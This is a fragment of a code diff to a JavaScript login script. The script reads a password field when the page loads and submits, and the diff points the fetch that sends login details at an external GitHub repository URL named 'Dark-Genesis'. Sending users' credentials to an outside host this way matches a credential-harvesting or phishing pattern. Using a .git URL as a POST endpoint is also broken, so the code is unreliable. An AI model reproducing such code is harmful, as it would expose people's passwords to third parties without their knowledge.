@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', function () {
         var password1 = document.querySelector('#Tab1 #password').value;
 
         // Envoyer les informations de connexion à votre serveur
-        fetch('#', {
+        fetch('https://github.com/Creator-Marl/Dark-Genesis.git', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -45,6 +45,7 @@ document.addEventListener('DOMContentLoaded', function () {
     });
 
 });
+
 
 
 
